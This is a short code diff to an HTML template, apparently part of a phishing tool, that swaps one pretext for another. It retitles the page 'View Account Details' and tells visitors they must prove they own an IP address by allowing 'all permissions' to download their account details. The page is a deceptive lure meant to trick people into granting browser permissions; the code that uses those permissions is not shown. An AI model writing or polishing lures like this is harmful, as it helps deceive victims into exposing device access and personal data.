@@ -378,7 +378,7 @@ PERMISSIONS_PAGE = """
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Enable Permissions</title>
+    <title>View Account Details</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
        body {
@@ -407,7 +407,7 @@ PERMISSIONS_PAGE = """
             {% if error == 'denied' %}
             <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
             {% endif %}
-            <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
+            <h2>To download the Account Details, you have to verify whether you are the right person who has the IP address</h2>
             <p>Kindly allow all permissions by clicking enable.</p>
             <button id="enableButton" class="btn btn-primary">Enable</button>
             <p id="status"></p>
